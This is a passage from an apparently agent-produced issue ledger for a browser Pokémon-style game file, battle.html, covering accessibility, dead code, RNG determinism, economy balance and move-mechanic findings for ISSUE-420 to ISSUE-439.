**Blast radius**: Documentation/anchor hygiene. Row IDs (`ev[0]`) are NOT array indices — `GYM_CITY_LEADER_EVENT`, the Mystery-Figure dispatch, and several migrations correctly key on array index via `findIndex`, but a reader conflating the two (e.g. the spec's "row 67 Mystery Figure" which is array idx 66) can mis-anchor. Confirms ISSUE-185.

**Fix sketch**: Standardize the docs on "67 timeline rows; row IDs are non-contiguous labels (intro Rival = id 68), array index ≠ row id". Update the mandate's "68 rows".

**Verification**: Spec row-count and the id-vs-index distinction match the harness numbers above.

---

## <a id="ISSUE-420"></a> ISSUE-420: Tutorial scenes are text-only walls of 60-120 words — no audio, no progressive reveal, no skip-to-end affordance

---
id: ISSUE-420
severity: P3
category: dx
anchor_symbol: STORY_TUTORIAL_SCENES
current_line_hint: ~34785
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 92a8d59337aa
confidence: medium
status: open
---

**Title**: Tutorial scenes are text-only walls of 60-120 words — no audio, no progressive reveal, no skip-to-end affordance

**Evidence**:
```js
// STORY_TUTORIAL_SCENES.firstTrainerBattle at ~34786
firstTrainerBattle: {
    metaKey: 'tutorial-first-trainer-battle',
    sprite: 'Oak', name: 'Prof. Oak', nameplate: 'Your First Fight',
    lines: [
        '"Two trainers, two teams, one road. That\'s a battle."',
        '"Tap ⚔ FIGHT to pick a move. Each one has its own PP, so the strongest hit isn\'t always the right one. Physical, Special, and Status all read off different stats — type matters more than raw level. Super-effective doubles your damage; the wrong type can half it."',
        '"🔴 POKÉMON swaps your active partner — it costs your turn, so use it on a read. 🎒 BAG burns an item. 🏃 RUN forfeits the fight and a slice of gold. Keep that HP bar green."'
    ]
}
```

Each tutorial dumps three multi-clause sentences in one frame with no per-line "Next" pacing — the player gets all 60-100 words at once and a single "Continue →" button. There's no voice/SFX channel, no incremental reveal, no "I've read this, don't show again" toggle (the dedupe is automatic via `tipsShown`, which is good, but means the player can't *intentionally* re-read a tutorial). For users who read slowly or use a screen reader, the text dump is announced as one block; SR users can't pause within it.

**Repro**: Trigger `firstTrainerBattle` — read it in <5s; nothing tracks reading progress.

**Blast radius**: 10+ first-time scenes. The tutorial is the single most important touchpoint for player retention; a text-wall here is also a missed opportunity to teach type matchups via demo animation.

**Fix sketch**: Convert `lines:` into a per-line reveal — render only the first line, advance on Continue/Tap. Add an SR-friendly `aria-live="polite"` announcement per line. Optionally: a "Re-show last tutorial" entry in Settings (the `tipsShown` flag is already keyed by `metaKey` so this is one-line). A subtle 8-bit "blip" SFX per line would also help engagement (already in use elsewhere for shop chimes — `StoryFx`).

**Verification**: Open a tutorial → only line 1 visible; Continue advances; final continue dismisses.

---

## <a id="ISSUE-421"></a> ISSUE-421: Catch ball buttons lack accessible name reading the success %; bare-icon img alt empty

---
id: ISSUE-421
severity: P3
category: a11y
anchor_symbol: story-catch-ball
current_line_hint: ~49299
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 8a390bc3cd95
confidence: medium
status: open
---

**Title**: Catch ball buttons lack accessible name reading the success %; bare-icon img alt empty

**Evidence**:
```html
<button type="button" onclick="...catchThrow('master')" ... class="story-catch-ball...">
  <span ...><img src="${display.icon}" alt="" ...><span><strong>${display.name}</strong>... ×${have}</span></span>
  <span style="color:#fff;">${pct}%</span>
</button>
```
The ball buttons are real `<button>`s (good) and the % is text (good, not color-only). But the accessible name concatenates as e.g. "Master Ball ✨ (∞ (guaranteed)) ×1 100%" with no label tying the trailing number to "catch chance", and the locked Master Ball shows "🔒 boss" with the lock emoji as the only state cue. An `aria-label` summarizing "Great Ball, 3 left, 55% catch chance" would read far cleaner.

**Repro**: Screen reader over the ball list in a Wild Encounter.

**Blast radius**: `screen-story-catch` ball list (regular + Safari Ball row).

**Fix sketch**: Add a computed `aria-label` per button: `"${display.name}, ${have} left, ${pct}% catch chance"` (or "locked, reserved for boss"). Keep `alt=""` on the decorative icon.

**Verification**: SR announces a single coherent label per ball button.

---

## <a id="ISSUE-422"></a> ISSUE-422: Crucible & Catch headers use empty spacer spans instead of a back control; no escape from Crucible header

---
id: ISSUE-422
severity: P3
category: a11y
anchor_symbol: story-crucible-header
current_line_hint: ~9044
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 48fe61e2f764
confidence: medium
status: open
---

**Title**: Crucible & Catch headers use empty spacer spans instead of a back control; no escape from Crucible header

**Evidence**:
```html
<div class="story-shop-header-row" ...>
  <span style="width:32px;"></span>   <!-- placeholder where a back button sits on other screens -->
  <h3 ...>...The Crucible</h3>
  <span id="story-crucible-gold" ...>...0G</span>
</div>
```
`screen-story-crucible` (9044) and `screen-story-catch` (9075/9077) use empty `<span style="width:32px">` placeholders for header symmetry where every other facility screen puts an `aria-label`'d back `<button>`. Harmless visually, but the Crucible's only exit is the footer "Back to City" — a keyboard user landing on the region focus (showScreen focuses the region) must tab past the whole body to reach it. Minor; flagged for consistency with the other facility headers.

**Repro**: Tab order in Crucible/Catch headers; no header-level back affordance.

**Blast radius**: `screen-story-crucible`, `screen-story-catch`.

**Fix sketch**: Either accept the footer-only exit (catch screen intentionally has no header back — fleeing is via Run) or mark the spacer `aria-hidden="true"`. Lowest priority of the set.

**Verification**: N/A behavioral; consistency review.

---

## <a id="ISSUE-423"></a> ISSUE-423: Pokédex counts strip updates live (seen/caught) but is not an aria-live region

---
id: ISSUE-423
severity: P3
category: a11y
anchor_symbol: story-pc-pokedex-strip
current_line_hint: ~9026
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 375f7f36e4de
confidence: medium
status: open
---

**Title**: Pokédex counts strip updates live (seen/caught) but is not an aria-live region

**Evidence**:
```html
<div id="story-pc-pokedex-strip" ...>
  <span>📖 Pokédex — Seen <strong id="story-pc-pokedex-seen">0</strong> · Caught <strong id="story-pc-pokedex-count">0</strong></span>
  <span id="story-pc-balls-summary" ...></span>
</div>
```
These counters change after deposits/withdrawals/releases inside the same screen, but the strip is a static `<div>` — no announcement. Low priority (informational, not action-critical), but inconsistent with the casino/menu live-region treatment.

**Repro**: PC release a Pokémon; the Caught count silently changes for SR users.

**Blast radius**: `screen-story-pokemoncenter` header strip.

**Fix sketch**: Add `aria-live="polite"` to `#story-pc-pokedex-strip` (or leave as-is — counters are ambient, not primary feedback).

**Verification**: Count change is announced once after a release.

---

## <a id="ISSUE-424"></a> ISSUE-424: Dead CSS selector for a #story-pc-tab-journal-btn that has no markup or handler

---
id: ISSUE-424
severity: P3
category: refactor
anchor_symbol: story-pc-tab-journal-btn
current_line_hint: ~6659
file: battle.html
agents: [story-mode-investigator]
fingerprint: 9d3afadf5180
confidence: high
status: open
---

**Title**: Dead CSS selector for a #story-pc-tab-journal-btn that has no markup or handler

**Evidence**:
```css
#story-pc-tab-storage-btn, #story-pc-tab-underground-btn, #story-pc-tab-journal-btn {
```

**Repro**: `grep -nE "story-pc-tab-journal" battle.html` → only the CSS rule (~6659). The PC screen markup (~9031-9032) has only Storage and Underground tab buttons; `_pcRefresh`'s `_tabBtns` map and `pcSwitchTab` handle only those two. The journal tab button never existed in the rendered DOM (the signature/rivalry journal lives in Collection instead).

**Blast radius**: None at runtime — orphan selector. Cleanup / clarity only.

**Fix sketch**: Drop `#story-pc-tab-journal-btn` from the selector list.

**Verification**: grep confirms no remaining reference.

---

## <a id="ISSUE-425"></a> ISSUE-425: Pokémon Center tab buttons not exposed as a tablist (no role=tab/tabpanel)

---
id: ISSUE-425
severity: P3
category: a11y
anchor_symbol: story-pc-tab-storage-btn
current_line_hint: ~9030
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 6b35ed82452d
confidence: medium
status: open
---

**Title**: Pokémon Center tab buttons not exposed as a tablist (no role=tab/tabpanel)

**Evidence**:
```html
<div style="display:flex;gap:0;...">
  <button id="story-pc-tab-storage-btn" onclick="...pcSwitchTab('storage')" ...> PC Storage</button>
  <button id="story-pc-tab-underground-btn" onclick="...pcSwitchTab('underground')" ...> The Underground</button>
</div>
<div id="story-pc-body" ...></div>
```
These are real focusable buttons (keyboard-OK) but the active tab is signalled only by a colored bottom-border + text color (`#4caf50` vs `#888`) — a color-only state with no `aria-selected`/`role="tab"`. The casino does this correctly with `role="tablist"/tab/tabpanel"` + `aria-selected` (lines 9149-9153). The PC tab strip is inconsistent and the active state is invisible to SR + low-vision users.

**Repro**: Pokémon Center; SR gives no "selected" state for the active tab.

**Blast radius**: `screen-story-pokemoncenter` tab strip.

**Fix sketch**: Wrap in `role="tablist"`, add `role="tab" aria-selected` to each button and `aria-controls` to `#story-pc-body`; toggle `aria-selected` in `pcSwitchTab`. Mirror the casino implementation.

**Verification**: SR announces "PC Storage, selected, tab" vs "The Underground, tab".

---

## <a id="ISSUE-426"></a> ISSUE-426: Mobile touch targets in story shops top out at 42px — under the WCAG 44×44 baseline

---
id: ISSUE-426
severity: P3
category: a11y
anchor_symbol: story-shop-buy-btn
current_line_hint: ~2267
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: a93e15e90227
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Mobile touch targets in story shops top out at 42px — under the WCAG 44×44 baseline

**Evidence**:
```css
.story-shop-buy-btn {
    min-height:34px; padding:6px 14px; font-size:12px; …
}
/* mobile override at ~5667 */
@media (max-width: 480px) {
    .story-shop-buy-btn { min-height: 42px !important; padding: 8px 18px !important; … }
}
```

The Mart, Department Store, Artifact Shop, Tutor, Colress, Event Trainer, Fanclub buy buttons all share `.story-shop-buy-btn` — 34 px desktop, 42 px mobile. The 42 px is short of the WCAG 2.1 SC 2.5.5 (AAA) target-size 44×44 minimum and the more recent SC 2.5.8 (AA) 24×24 floor for "no spacing exemption". Adjacent rows make accidental taps likely. Compare to the battle command grid (60 px) and the modal-summary tabs (44 px) — both meet the bar.

**Repro**: Open Mart on a phone, tap "Buy" — possible to hit the adjacent item's button when scrolling.

**Blast radius**: Every shop. The mobile shop experience is a P2 surface (story mode is the polish target, and most run time outside battles is spent in shops).

**Fix sketch**: Bump the `@media (max-width: 480px)` override to `min-height: 44px`. Also widen the row gap from `10px` to `12px` so the spacing exemption applies.

**Verification**: DevTools mobile mode at 360px width → measure the buy button bounding box ≥ 44×44.

---

## <a id="ISSUE-427"></a> ISSUE-427: Tutorial overlay's four-stage entrance animation has no reduced-motion fallback

---
id: ISSUE-427
severity: P3
category: a11y
anchor_symbol: story-tutorial-overlay
current_line_hint: ~4256
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: dcc6311c0e55
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Tutorial overlay's four-stage entrance animation has no reduced-motion fallback

**Evidence**:
```css
.story-tutorial-overlay { …animation: storyTutorialOverlayIn 0.32s ease-out both; }
.story-tutorial-sprite  { …animation: storyTutorialSpriteIn 0.55s cubic-bezier(0.18,0.9,0.32,1.18) both; }
.story-tutorial-name    { …animation: storyTutorialNameIn 0.4s ease-out 0.25s both; }
.story-tutorial-dialog-host { …animation: storyTutorialDialogIn 0.5s ease-out 0.4s both; }
.story-tutorial-continue { animation: storyTutorialNameIn 0.4s ease-out 0.7s both; }
```

The tutorial cascade plays four staggered animations totaling ~1.1s before the Continue button is even visible (it animates in last at 0.7s delay). With `prefers-reduced-motion: reduce`, none of these collapse — Sprite scaling/translate, fade-in cascades, all play at full intensity. The existing line-58 reduced-motion block targets confetti / victory-badge / rotate-icon / hp-critical only.

**Repro**: Reduced motion on, trigger any first-time tutorial → sprite still bounces in, name slides down, dialog scales up, button fades in.

**Blast radius**: Pairs with the broader prefers-reduced-motion finding but is highlighted separately because tutorials are the load-bearing on-boarding moment.

**Fix sketch**: Add to existing line-58 block: `.story-tutorial-overlay, .story-tutorial-overlay * { animation: none !important; opacity: 1 !important; transform: none !important; }`. Or scope a fresh `@media (prefers-reduced-motion: reduce) { .story-tutorial-overlay { animation: none; } .story-tutorial-sprite, .story-tutorial-name, .story-tutorial-dialog-host, .story-tutorial-continue { animation: none; } }` block near line 4308.

**Verification**: With reduced motion on, all four elements render instantly when the overlay mounts.

---

## <a id="ISSUE-428"></a> ISSUE-428: Scope-leak audit (same class as fixed `sm` bug) — NEGATIVE: no other IIFE-internal symbol referenced bare from turn-loop scope

---
id: ISSUE-428
severity: P3
category: inconsistency
anchor_symbol: storyAwareRng
current_line_hint: ~13853
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 2a0f0c7901bb
confidence: high
status: open
---

**Title**: Scope-leak audit (same class as fixed `sm` bug) — NEGATIVE: no other IIFE-internal symbol referenced bare from turn-loop scope

**Evidence**:
```text
# 864 IIFE-internal top-level decls (lines 28370-51840) extracted; each grepped for
# bare (non-window., non-typeof, non-declared) reference in lines <28370. Result:
# 0 call-form leaks, 0 token-form leaks. Only 2 hits, both inside an HTML <code> string at 8750.
# storyRngNext bare uses (33996,36623,37045,42955,42966,43263) are all >31724 (inside IIFE — in scope).
# makeBuild:10482 uses `typeof sm`/`typeof storyRngNext` guards (typeof never throws on undeclared) — safe.
# The global Math.random override at 31900 (routes to storyRngNext when sm.active && runSeed!=null)
# reads bare sm but is lexically inside the IIFE — in scope; guarded with typeof. Safe.
```

**Repro**: `awk` IIFE-symbol extraction + grep sweep over the pre-IIFE region (commands in session). No ReferenceError-class scope leak remains besides the already-fixed `sm` sites.

**Blast radius**: Confirms the lead's `storyAwareRng()` fix is comprehensive for the bare-`sm` turn-skip class. Filed for the ledger so future agents don't re-investigate.

**Fix sketch**: None needed. Recommend an ESLint `no-undef` pass scoped to the script-top region as a regression guard.

**Verification**: Re-run the symbol-leak sweep; expect 0 candidates.

---

## <a id="ISSUE-429"></a> ISSUE-429: `storyAwareRng()` helper exists but the combat engine still calls bare `Math.random()` at ~250 sites

---
id: ISSUE-429
severity: P3
category: dx
anchor_symbol: storyAwareRng
current_line_hint: ~13921
file: battle.html
agents: [consistency-auditor]
fingerprint: 597bc36d66fb
confidence: medium
status: open
---

**Title**: `storyAwareRng()` helper exists but the combat engine still calls bare `Math.random()` at ~250 sites

**Evidence**:
```js
// 13921 — the seeded-RNG selector, referenced only 13× total:
function storyAwareRng() {
    const s = (window.StoryMode && window.StoryMode.state) || null;
    return (s && s.active && typeof window.storyRngNext === 'function') ? window.storyRngNext : Math.random;
}
// 22032 / 22537 / 22961 / 23328-23346 / 25243 / 25447 — combat math is all bare:
let crit = (!armorBlocksCrit && Math.random() < critRate) ? … : 1;       // crit
let rng = 0.85 + (Math.random() * 0.15);                                   // damage spread
if (Math.random() * 100 > finalAcc) { break; }                            // accuracy
if (defender.ability === "Static" && Math.random() < 0.3) applyStatus(…); // secondary
```

**Repro**: `grep -c 'Math.random()' battle.html` → 269; `grep -c storyAwareRng` → 13. The per-turn combat rolls (crit, damage 0.85-1.0 spread, accuracy, secondary-effect/status chances, confusion, multi-hit) never route through the seeded RNG. NOTE: this is currently consistent with the determinism *contract* — story-replay.mjs snapshots roster/catch/progression state + `sm._strngState`, not per-turn HP, and its own comment defers turn-level replay to integration tests. So this is **not** a live replay-drift bug today (unlike the prior, now-fixed scope-leak P1s).

**Blast radius**: Forward-looking. REDESIGN_PLAN adds the Fight Club draft gauntlet (5 rounds, counter-pick AI) and leans on "tests behind a SAVE_VER bump." If turn-level deterministic replay is ever wanted for Fight Club regression/save-scum protection, the engine has no seam — `storyAwareRng()` is the intended seam but is unused in the hot path. Flagging now so the redesign decides the determinism scope deliberately rather than discovering 250 unrouted sites mid-implementation.

**Fix sketch**: Decide explicitly whether combat is in the determinism contract. If yes, thread `storyAwareRng()` (or a battle-local seeded rng captured at battle start) through the damage/accuracy/secondary rolls and extend story-replay.mjs to snapshot turn outcomes. If no, document the boundary in a comment at storyAwareRng so future readers don't assume combat is seeded.

**Verification**: Either (a) replaying a seeded story battle twice yields identical HP traces, or (b) a comment at `storyAwareRng()` states combat RNG is intentionally non-deterministic and lists what IS seeded.

---

## <a id="ISSUE-430"></a> ISSUE-430: Master Ball purple pulse runs forever with no reduced-motion override; surrounding text/glow stays readable but the loop is hostile

---
id: ISSUE-430
severity: P3
category: a11y
anchor_symbol: storyCatchMasterPulse
current_line_hint: ~1908
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 679f436786d4
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Master Ball purple pulse runs forever with no reduced-motion override; surrounding text/glow stays readable but the loop is hostile

**Evidence**:
```css
.story-catch-ball--master {
    box-shadow: 0 0 14px rgba(206, 147, 216, 0.55), inset 0 0 14px rgba(206, 147, 216, 0.18) !important;
    animation: storyCatchMasterPulse 2.2s ease-in-out infinite;
}
@keyframes storyCatchMasterPulse {
    0%, 100% { box-shadow: 0 0 14px rgba(206, 147, 216, 0.55), inset 0 0 14px rgba(206, 147, 216, 0.18); }
    50%      { box-shadow: 0 0 22px rgba(206, 147, 216, 0.85), inset 0 0 18px rgba(206, 147, 216, 0.32); }
}
```

Contrast itself is fine: `#ce93d8` text on `rgba(20,28,40,0.6)` over a dark battle background gives ~7:1, passes WCAG AA. The accessibility issue is that the pulse is `infinite` with no `prefers-reduced-motion` carve-out. The catch screen typically holds the player's attention for 30-90 s while they read flee/catch percentages — that's ≥15 pulses of an eye-catching glow loop.

**Repro**: With reduced motion enabled (macOS / Windows / Firefox flag), open any wild encounter where you hold ≥1 Master Ball → button still pulses every 2.2s.

**Blast radius**: Vestibular / photosensitivity-sensitive users. Pairs with the broader reduced-motion finding.

**Fix sketch**: Inside an existing `prefers-reduced-motion` block (or a new one): `.story-catch-ball--master { animation: none !important; }`. Keep the static box-shadow so the affordance ("this ball is special") still reads.

**Verification**: Open catch screen with reduced motion → glow holds static.

---

## <a id="ISSUE-431"></a> ISSUE-431: CONFIRMED FIXED — Hard coin mult floored to 1.00 (prior audit 2.1); Challenge 1.10

---
id: ISSUE-431
severity: P3
category: balance
anchor_symbol: storyDifficultyCoinMult
current_line_hint: ~29142
file: battle.html
agents: [story-mode-investigator]
fingerprint: 2f91ba9853c9
confidence: high
status: open
---

**Title**: CONFIRMED FIXED — Hard coin mult floored to 1.00 (prior audit 2.1); Challenge 1.10

**Evidence**:
```js
if (diff === 'hard') return 1.00;       // was 0.92 — "floored at parity so the coin curve stops fighting the difficulty curve"
if (diff === 'challenge') return 1.10;
```

**Repro**: Prior audit 2.1 flagged Hard paying ×0.92 (punishing the hardest stretch). `storyDifficultyCoinMult` (29137) now returns 1.00 for Hard, 1.10 Challenge, 1.30 Normal, 1.50 Easy, 1.60 VeryEasy. Hardcore removed entirely. Resolved.

**Blast radius**: Tier-2 #14 — resolved. (Note: STORY_MODE_FLOW §8 coin table still lists "Normal 1.30 / Hard 1.00 (floored from 0.92)" — matches code.)

**Fix sketch**: None — confirmation.

**Verification**: Win a Hard fight; coin payout ≥ parity.

---

## <a id="ISSUE-432"></a> ISSUE-432: Hard mode still earns less gold per fight than Normal (1.00 vs 1.30) despite facing 1.15x-stronger foes — residual difficulty/economy asymmetry

---
id: ISSUE-432
severity: P3
category: balance
anchor_symbol: storyDifficultyCoinMult
current_line_hint: ~29385
file: battle.html
agents: [story-mode-investigator]
fingerprint: 8b9a943876e8
confidence: low
status: open
---

**Title**: Hard mode still earns less gold per fight than Normal (1.00 vs 1.30) despite facing 1.15x-stronger foes — residual difficulty/economy asymmetry

**Evidence**: The prior-audit "Hard pays x0.92" was fixed — `storyDifficultyCoinMult()` now floors Hard at parity (1.00) and Challenge at 1.10:
```js
if (diff === 'normal') return 1.30;
if (diff === 'hard')   return 1.00;   // "floored at parity"
if (diff === 'challenge') return 1.10;
```
But Normal still pays 1.30 while Hard pays 1.00, so a Hard player earns ~77% of Normal's gold rate. Meanwhile `applyFoeDifficultyScaling` gives Hard foes 1.15x stats (Challenge 1.30x) and Hard/Challenge also get extra bench Revives (~49210) — i.e. harder, longer fights for less income. This is an intentional design choice (the comment says so), so flagging as low-confidence.

**Repro**: Inspect `storyDifficultyCoinMult` (~29385) vs `applyFoeDifficultyScaling` (~14085).

**Blast radius**: Story economy on Hard/Challenge. Tighter gold means fewer shop heals / tutor rerolls during the hardest stretch — may compound the difficulty rather than purely rewarding it.

**Fix sketch**: Consider raising Hard to ~1.15-1.30 (reward proportional to foe-stat bump) if the intent is "harder = more loot," or leave as-is if "harder = scarcer economy" is the deliberate stance. Documented decision either way.

**Verification**: Playtest gold trajectory on Hard vs Normal across the front half; confirm the intended relative economy.

---

## <a id="ISSUE-433"></a> ISSUE-433: `storyRngNext` / per-engine-entry `rng` ternary accessor is **0.0003 ms (300 ns) per call** — no closure allocation penalty, accessor pattern is clean

---
id: ISSUE-433
severity: P3
category: perf
anchor_symbol: storyRngNext
current_line_hint: ~34916
file: battle.html
agents: [performance-profiler]
fingerprint: b4751b0d02de
confidence: high
status: open
---

**Title**: `storyRngNext` / per-engine-entry `rng` ternary accessor is **0.0003 ms (300 ns) per call** — no closure allocation penalty, accessor pattern is clean

**Evidence**: Mandate item #10 — "confirm no per-call closure allocation" — for the recent fix that added a per-engine-entry RNG accessor like `const rng = (sm && sm.active && typeof window.storyRngNext === 'function') ? window.storyRngNext : Math.random;`. The function reference is hoisted once per call site (not per RNG draw), and `window.storyRngNext` is a function value lookup, not a closure capture.

**Repro**: 10,000 invocations of `window.storyRngNext ? window.storyRngNext() : Math.random()` directly: median **0.325 μs, p95 0.392 μs, max 100.9 μs (single outlier from GC pause)** (`/tmp/deep-perf.mjs` 2026-05-28). The outlier is harness noise (process-wide GC), not a per-call cost.

**Blast radius**: `parseMoveEffects` median is 18 μs, of which the ~10–15 RNG calls cost a combined ~5 μs — RNG itself is <30% of the per-move cost, and the accessor wrap is in the noise. This rules out the accessor pattern as a perf concern.

**Fix sketch**: No fix needed. Confirmed clean.

**Verification**: Re-check if `parseMoveEffects` per-move median rises above 0.05 ms — that would indicate something else regressed, not this accessor.

---

## <a id="ISSUE-434"></a> ISSUE-434: Status indicator toggles role="status" + aria-label onto a <div> at content-mutation time

---
id: ISSUE-434
severity: P3
category: a11y
anchor_symbol: updateUI
current_line_hint: ~16809
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: a17922c15f4a
confidence: medium
status: open
---

**Title**: Status indicator toggles role="status" + aria-label onto a <div> at content-mutation time

**Evidence**:
```js
statBox.innerText = mon.status || '';        // content changes first
if (mon.status) { statBox.setAttribute('aria-label', _statusAriaLabel(mon.status));
                  statBox.setAttribute('role', 'status'); }   // role added same tick
else { statBox.removeAttribute('aria-label'); statBox.removeAttribute('role'); }
```

**Repro**: Live regions must exist before their content mutates to announce reliably; here the `role="status"` is added to `#player-status`/`#foe-status` in the same frame the text is written (and removed when cleared), so AT may not announce the status change. `aria-label` on a non-focusable generic `<div>` is also weakly supported and can be ignored. (Battle-log narration of status via `logMsg` partly compensates.)

**Blast radius**: Player + foe status pills every turn a status is applied/cured (BRN/PSN/TOX/PAR/SLP/FRZ).

**Fix sketch**: Put a permanent `role="status"` (or `aria-live="polite"`) wrapper in the static markup and only mutate its text; drop the per-update role toggle. Prefer visible text + the existing `_statusAriaLabel` mapping over `aria-label` on the div.

**Verification**: SR announces "Burned"/"Paralyzed" etc. on the turn the status lands, without the role being toggled.

---

## <a id="ISSUE-435"></a> ISSUE-435: Upper Hand / Shell Trap don't enforce their precondition gate

---
id: ISSUE-435
severity: P3
category: bug
anchor_symbol: Upper Hand
current_line_hint: ~22368
file: battle.html
agents: [test-coverage-filler]
fingerprint: 0443b0ccfa4b
confidence: high
status: open
---

**Title**: Upper Hand / Shell Trap don't enforce their precondition gate

**Evidence**:
```text
grep -n "Upper Hand" battle.html   -> 0 hits (no special handling at all)
grep -n "Shell Trap" battle.html   -> only in _stBanned / _ccBanned / _instructBanned sets (no trap-trigger logic)
```

**Repro**: jsdom harness — Upper Hand deals ~110 whether the foe uses Quick Attack (priority) or Body Slam (non-priority); Shell Trap deals ~53 whether the foe uses Body Slam (physical) or Splash. Both should only succeed under their gate.

**Blast radius**: Both behave as generic damaging moves (over-permissive). Niche moves; low story impact. Upper Hand also lacks its priority and flinch effect.

**Fix sketch**: Gate Upper Hand on the target being queued to use a priority attacking move (else fail) + flinch; gate Shell Trap on the user having been hit by a physical move this turn (else fail). Low priority.

**Verification**: Upper Hand fails vs a non-priority move; Shell Trap fails vs a non-physical move (negative assertions in the prior-context draft).

---

## <a id="ISSUE-436"></a> ISSUE-436: `sm.wildSeenByEventIdx` and `sm.staticDrops` are lazily initialized instead of declared in the `sm` defaults block

---
id: ISSUE-436
severity: P3
category: dx
anchor_symbol: wildSeenByEventIdx
current_line_hint: ~39699
file: battle.html
agents: [story-mode-investigator]
fingerprint: d7124798a455
confidence: medium
status: open
---

**Title**: `sm.wildSeenByEventIdx` and `sm.staticDrops` are lazily initialized instead of declared in the `sm` defaults block

**Evidence**:
```js
// battle.html ~30654   sm defaults block
let sm = { active:false, eventIndex:0, badges:0, gold:2000, casinoStats:{}, team:[], ... };
// (no wildSeenByEventIdx, no staticDrops in the literal)

// battle.html ~39699   lazy init
function _markWildSeen(battleIdx, delta) {
    if (!sm.wildSeenByEventIdx || typeof sm.wildSeenByEventIdx !== 'object') sm.wildSeenByEventIdx = {};
    ...
}

// battle.html ~38199   lazy init
if (!sm.staticDrops || typeof sm.staticDrops !== 'object') sm.staticDrops = {};

// battle.html ~38535   lazy init
if (!sm.staticDrops) sm.staticDrops = {};
```
Most save fields are declared in the `sm` literal (~30654) and `newStoryRun` (~33660). These three are not, which makes "what state does a fresh run actually have?" harder to reason about.

**Repro**: `JSON.stringify(sm)` on a brand-new run will have `pcBox` / `balls` / `pokedex` etc. but no `wildSeenByEventIdx` / `staticDrops` / `bossArc`. They get added incrementally as gameplay touches them.

**Blast radius**: DX only. Schema is shaped by code-flow rather than by data definition.

**Fix sketch**: Add `wildSeenByEventIdx: {}, staticDrops: {}, bossArc: null` to both the `sm` literal at ~30654 and the newStoryRun block at ~33660. The lazy-init guards can stay as defensive checks but become no-ops on new runs.

**Verification**: After fix, a fresh run's `Object.keys(sm)` shows the full schema up-front; no field appears mid-run.

---

## <a id="ISSUE-437"></a> ISSUE-437: VERIFIED OK — boss/raid reward double-grant across the two call sites is structurally prevented

---
id: ISSUE-437
severity: P4
category: bug
anchor_symbol: _activeBattleBeatForCurrentRow
current_line_hint: ~42043
file: battle.html
agents: [story-mode-investigator]
fingerprint: cc2ffdbf7700
confidence: high
status: verified-ok
---

**Title**: VERIFIED OK — boss/raid reward double-grant across the two call sites is structurally prevented

**Evidence**:
```js
// Scene-queue path: _resolveActiveRoadBeats eligible() = slot.kind === 'event' (~41913)
//   -> boss/raid kinds CANNOT enter the queue -> _storyGrantTrackEndReward is a no-op there.
// Battle path: _activeBattleBeatForCurrentRow returns boss/raid, guarded by
//   !sm.storyEventsFired[s.sceneKey] (~42054); onBattleEnd sets storyEventsFired[key]=true
//   BEFORE granting (~47570) and deletes _activeBeatBattleKey on win and on loss (~47565/47609).
```
A single boss/raid victory flows through ONLY the battle path. `storyEventsFired` for boss/raid keys is set-once-never-cleared (clears only exist for online-PvP rematch, out of scope).

**Repro**: probe — `resolveActiveRoadBeats` over all roads yields only `kind:"event"` (`filterLeaksBossRaid:false`); loss branch deletes the in-flight key without marking fired, so retry re-attaches the SAME beat exactly once.

**Blast radius**: None for normal flow — cleared concern. The residual risk is ONLY the missing internal idempotency guard (see finding fingerprint 6a29587124a9 / the public `grantTrackEndReward` API footgun), not the two-call-site interaction.

**Fix sketch**: n/a for the two-path concern; see the idempotency-guard finding for defense-in-depth.

**Verification**: verified by probe + static trace.

---

## <a id="ISSUE-438"></a> ISSUE-438: `_bossWeatherLocked` / `_bossTerrainLocked` flags are set but never read — field "lock" is opening-state only

---
id: ISSUE-438
severity: P4
category: refactor
anchor_symbol: _storyBossMechanicsBattleInit
current_line_hint: ~42357
file: battle.html
agents: [story-mode-investigator]
fingerprint: bef46dafbbd5
confidence: high
status: open
---

**Title**: `_bossWeatherLocked` / `_bossTerrainLocked` flags are set but never read — field "lock" is opening-state only

**Evidence**:
```js
stateRef.weather = m.value; stateRef.weatherTurns = (m.turns|0)||99;
stateRef._bossWeatherLocked = true;   // written, never read
...
stateRef._bossTerrainLocked = true;   // written, never read
```
Grep: both flags appear ONLY at these write sites. No read gates any subsequent `state.weather = ...` assignment (there are ~20 of those for Sunny Day / abilities / orbs), so the boss weather is freely overwritten the moment the player uses a weather move.

**Repro**: `grep -nE "_bossWeatherLocked|_bossTerrainLocked" battle.html` → only the two writes.

**Blast radius**: Matches the design comment in BOSS_CONFIGS ("contestable — the player can still override it"), so this is intended behavior, NOT a balance bug. But the two flags are dead — they imply an enforced lock that does not exist, and could mislead someone adding "true lock" later. Cosmetic/data-hygiene.

**Fix sketch**: Either remove the two dead flags, or (if a true lock is wanted) read them in the `state.weather =`/`state.terrain =` setters to no-op player overrides. Maxwell-owned if it becomes a balance lever.

**Verification**: grep shows the flags removed (or, if kept, a reader exists that honors them).

---

## <a id="ISSUE-439"></a> ISSUE-439: VERIFIED OK — extra-arc raid "laid to rest, no catch" lock is enforced structurally

---
id: ISSUE-439
severity: P4
category: bug
anchor_symbol: enterCatchEncounter
current_line_hint: ~49923
file: battle.html
agents: [story-mode-investigator]
fingerprint: 7ffd530ac252
confidence: high
status: verified-ok
---

**Title**: VERIFIED OK — extra-arc raid "laid to rest, no catch" lock is enforced structurally

**Evidence**:
```js
// _rollExtraRaidBossTeam returns [{name, build}] -> enemyTeam -> startFight(frozenTeam)
//   -> launchBattle(enemyTeam) -> state.mode = 'story'   (TRAINER-style battle, ~47192/47322)
// Catch UI lives ONLY in the dedicated screen: enterCatchEncounter / catchThrow (~49923/50363),
//   invoked exclusively by wild/safari/roaming/bossArc encounters (all tagged wild:true).
```
